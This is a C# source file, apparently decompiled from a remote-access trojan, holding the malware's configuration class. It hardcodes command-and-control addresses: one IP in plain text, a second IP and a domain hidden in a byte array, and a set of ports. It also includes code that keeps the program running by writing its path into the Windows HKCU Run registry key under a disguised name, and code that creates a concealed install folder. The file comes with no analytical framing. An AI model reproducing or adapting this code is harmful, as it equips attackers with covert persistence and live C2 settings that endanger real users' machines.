using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace fhlergarw;

internal static class fhlergarwCONF
{
	public static string fhlergarwdefaultP = "210.105.231.121|fhlergarw".Split(new char[1] { '|' })[0];

	public static string fhlergarwmainApp = "fhlergarw|fhlergarw".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 4289, 6722, 12816, 14572, 16286 };

	public static int fhlergarwport;

	public static byte[] fhlergarwvpsips = new byte[32]
	{
		49, 48, 52, 46, 49, 52, 52, 46, 49, 57,
		56, 46, 49, 48, 53, 63, 117, 114, 100, 103,
		115, 101, 114, 118, 105, 99, 101, 115, 46, 110,
		101, 116
	};

	public static string fhlergarwappPath = "\\Hadris\\|fhlergarw".Split(new char[1] { '|' })[0];

	public static string fhlergarwpc_id = "whirx|fhlergarw".Split(new char[1] { '|' })[0];

	public static string fhlergarwremvUser = "dldlmnr|fhlergarw".Split(new char[1] { '|' })[0];

	public static string fhlergarwfilesLogs = "bislrd".Split(new char[1] { '|' })[0];

	public static string fhlergarwAppPath = "";

	public static string fhlergarwOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!fhlergarw".Split(new char[1] { '!' })[0];
		}
	}

	public static void fhlergarwset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|fhlergarw".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = fhlergarwpc_id;
			object value = registryKey.GetValue(text + app);
			if (value == null)
			{
				registryKey.SetValue(text + app, path);
			}
			else if (value.ToString() != path)
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}

	public static string fhlergarwget_mpath()
	{
		if (fhlergarwAppPath != "")
		{
			return fhlergarwAppPath;
		}
		fhlergarwAppPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + fhlergarwappPath;
		try
		{
			if (!Directory.Exists(fhlergarwAppPath))
			{
				Directory.CreateDirectory(fhlergarwAppPath);
			}
			if (Directory.Exists(fhlergarwAppPath))
			{
				return fhlergarwAppPath;
			}
		}
		catch
		{
		}
		fhlergarwAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + fhlergarwappPath;
		try
		{
			if (!Directory.Exists(fhlergarwAppPath))
			{
				Directory.CreateDirectory(fhlergarwAppPath);
			}
			if (!Directory.Exists(fhlergarwAppPath))
			{
				return fhlergarwAppPath;
			}
		}
		catch
		{
		}
		fhlergarwAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + fhlergarwappPath;
		try
		{
			if (!Directory.Exists(fhlergarwAppPath))
			{
				Directory.CreateDirectory(fhlergarwAppPath);
			}
			if (!Directory.Exists(fhlergarwAppPath))
			{
				return fhlergarwAppPath;
			}
		}
		catch
		{
		}
		fhlergarwAppPath = Application.get_ExecutablePath();
		return fhlergarwAppPath;
	}
}
